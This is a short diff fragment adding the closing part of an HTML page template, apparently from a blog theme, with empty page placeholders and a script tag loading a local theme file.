+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+
+
+    
+        
+    
+        
+            
+<script class="custom-inject-js" src="/js/custom-theme.js" data-pjax></script>
+
+        
+    
+
+</body>
+</html>
